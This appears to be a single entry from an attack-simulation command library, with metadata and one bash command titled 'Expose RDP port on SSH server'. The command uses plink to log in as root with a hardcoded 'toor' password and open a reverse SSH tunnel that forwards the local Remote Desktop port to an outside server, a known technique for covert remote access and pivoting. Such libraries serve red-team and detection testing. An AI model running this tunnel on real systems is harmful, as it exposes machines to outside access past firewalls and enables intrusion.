---
id: 67e07609-f01a-4e55-8540-d45b86b35faa
name: Expose RDP port on SSH server
type: command
executor: bash
data: plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389
output: null
created_at: '2023-04-06T03:56:22.999945+00:00'
updated_at: '2023-04-10T20:25:11.704574+00:00'
---

# Expose RDP port on SSH server

```bash
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389
```
